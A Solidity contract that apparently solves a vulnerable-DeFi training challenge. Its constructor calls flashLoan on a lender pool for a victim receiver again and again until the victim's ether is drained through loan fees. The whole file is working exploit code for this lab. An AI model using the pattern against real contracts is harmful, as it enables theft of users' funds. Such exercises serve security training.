// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";

contract AttackFlashLoanReceiver {
    constructor(address _flashLoanReceiver, address payable _lenderPool) {
        for (; address(_flashLoanReceiver).balance > 0;) {
            NaiveReceiverLenderPool(_lenderPool).flashLoan(_flashLoanReceiver, 1);
        }
    }
}
